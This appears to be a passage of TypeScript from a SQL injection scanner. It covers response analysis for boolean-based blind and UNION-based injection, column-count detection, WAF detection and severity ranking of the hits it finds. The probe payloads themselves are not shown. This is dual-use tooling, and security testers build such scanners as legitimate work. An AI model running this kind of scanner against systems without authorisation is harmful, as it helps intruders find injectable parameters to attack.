      if (lengthDiff > 250 || pctDiff > 0.12) {
        const hit: SqliHit = {
          probe, technique: 'Boolean-Based Blind', dbType: 'Unknown',
          evidence: `Response length: ${resp.html.length} chars vs baseline: ${baselineLength} chars (Δ${resp.html.length - baselineLength})`,
          responseTime: resp.time, baselineTime, isTimeBased: false, severity: 'high',
          wafDetected: detectWaf(resp.html, resp.status),
        };
        hits.push(hit);
        techniques.add('Boolean-Based Blind');
        onHit?.(hit);
        return;
      }
    }

    // UNION-based: look for marker or column count
    if (probe.technique === 'union' && resp.html.includes('sqlitest')) {
      const match = probe.payload.match(/SELECT ([\d,]+)/i);
      if (match) {
        columnCount = match[1].split(',').length;
      }
      const hit: SqliHit = {
        probe, technique: 'UNION-Based', dbType: detectDbType(resp.html) || 'Unknown',
        evidence: `UNION marker "sqlitest" reflected in response (cols: ${columnCount ?? 'unknown'})`,
        responseTime: resp.time, baselineTime, isTimeBased: false, severity: 'critical',
        wafDetected: detectWaf(resp.html, resp.status),
      };
      hits.push(hit);
      techniques.add('UNION-Based');
      onHit?.(hit);
    }
  });

  await withConcurrency(tasks, 6);

  const sevRank: Record<string, number> = { low: 1, medium: 2, high: 3, critical: 4 };
  const worstSev = hits.reduce((best, h) =>
    (sevRank[h.severity] ?? 0) > (sevRank[best] ?? 0) ? h.severity : best, 'low');

  if (dbType === 'Unknown' && hits.length > 0) {
    const dbHit = hits.find(h => h.dbType !== 'Unknown');
    if (dbHit) dbType = dbHit.dbType;
  }

  return {
    param: paramName,
    originalValue,
    vulnerable: hits.length > 0,
    severity: hits.length > 0 ? worstSev : 'none',
    dbType,
    techniques: [...techniques],
    hits,
    columnCount,
    totalTested: SQLI_PROBES.length,
    wafDetected,
  };
}
